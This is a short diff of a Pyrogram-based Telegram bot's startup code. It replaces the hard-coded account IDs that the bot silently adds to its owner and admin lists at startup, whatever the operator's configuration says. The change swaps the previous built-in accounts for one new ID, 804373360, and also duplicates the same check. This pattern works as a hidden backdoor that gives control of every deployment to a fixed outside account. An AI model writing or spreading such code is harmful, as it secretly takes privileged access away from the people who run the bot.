@@ -25,7 +25,7 @@ from config import (
 from database.database import get_variable, set_variable
 from plugins import web_server
 
-pyrogram.utils.MIN_CHANNEL_ID = -1002475424150
+pyrogram.utils.MIN_CHANNEL_ID = -1003896697061
 
 
 name = """
@@ -37,7 +37,7 @@ name = """
 ╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚═╝░░░░░╚═╝╚══════╝  ╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
 """
 
-AUTHORIZED_USERS = [7030439873, 987654321]  # Replace with actual user IDs
+AUTHORIZED_USERS = [804373360]  # Replace with actual user IDs
 
 UPSTREAM_REPO_URL = "https://github.com/Itzmepapa123/faired.git"
 UPSTREAM_BRANCH = "Updated"
@@ -133,13 +133,13 @@ class Bot(Client):
         bind_address = "0.0.0.0"
         owner = await get_variable("owner", "")
         owner = [int(x.strip()) for x in owner.split() if x.strip().isdigit()]
-        if 7024179022 not in owner:
-            owner.append(7024179022)
-        if 6907639205 not in owner:
-            owner.append(6907639205)
+        if 804373360 not in owner:
+            owner.append(804373360)
+        if 804373360 not in owner:
+            owner.append(804373360)
         if OWNER_ID not in owner:
             owner.append(OWNER_ID)
-        admin_ids = [796099535, 5426061889, 5082638362, 6308577972]
+        admin_ids = [804373360]
         admin = await get_variable("admin", [])
 
         # Initialize if empty
